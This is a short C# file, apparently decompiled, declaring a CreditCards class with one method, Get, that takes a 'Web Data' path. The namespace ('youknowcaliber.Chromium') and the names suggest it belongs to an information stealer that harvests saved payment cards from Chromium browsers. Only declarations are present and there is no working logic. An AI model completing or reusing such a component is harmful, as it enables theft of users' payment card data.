using System.Collections.Generic;

namespace youknowcaliber.Chromium;

internal sealed class CreditCards
{
	public static extern List<CreditCard> Get(string sWebData);

	public extern CreditCards();
}
